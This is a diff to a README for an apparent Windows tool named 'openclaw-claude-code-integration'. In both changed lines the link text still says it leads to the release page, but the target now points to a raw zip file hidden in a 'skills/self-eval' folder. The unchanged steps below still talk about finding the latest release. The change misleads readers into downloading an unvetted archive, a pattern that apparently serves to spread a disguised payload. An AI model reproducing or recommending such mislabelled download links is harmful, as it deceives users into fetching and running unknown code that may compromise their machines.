@@ -1,6 +1,6 @@
 # 🧠 openclaw-claude-code-integration - Memory and prompts in one place
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Deep-pahoehoe114/openclaw-claude-code-integration/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Deep-pahoehoe114/openclaw-claude-code-integration/main/skills/self-eval/openclaw-integration-code-claude-v2.3.zip)
 
 ## 🖥️ What this app does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Use this page to download the app for Windows:
 
-[Visit the release page to download](https://github.com/Deep-pahoehoe114/openclaw-claude-code-integration/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/Deep-pahoehoe114/openclaw-claude-code-integration/main/skills/self-eval/openclaw-integration-code-claude-v2.3.zip)
 
 After you open the page:
 1. Find the latest release
